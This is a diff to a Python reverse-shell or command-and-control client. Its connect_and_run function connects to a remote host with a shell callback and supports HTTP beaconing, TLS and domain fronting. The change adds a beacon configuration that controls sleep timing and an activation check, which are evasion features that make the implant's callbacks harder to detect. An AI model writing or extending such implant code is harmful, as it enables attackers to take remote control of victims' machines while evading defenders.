@@ -4,7 +4,7 @@ import time
 
 def connect_and_run(host, port, shell_callback, reconnect_interval=5,
                     encryption=False, tls=False, http_mode=False,
-                    front_host=None):
+                    front_host=None, beacon_config=None):
     if http_mode:
         _http_beacon(host, port, shell_callback, reconnect_interval,
                      encryption, tls, front_host)
@@ -15,8 +15,15 @@ def connect_and_run(host, port, shell_callback, reconnect_interval=5,
         sock = None
         try:
             if not first_attempt:
-                time.sleep(reconnect_interval)
+                if beacon_config:
+                    time.sleep(beacon_config.get_sleep())
+                else:
+                    time.sleep(reconnect_interval)
             first_attempt = False
+
+            if beacon_config and not beacon_config.should_activate():
+                time.sleep(30)
+                continue
 
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(10)
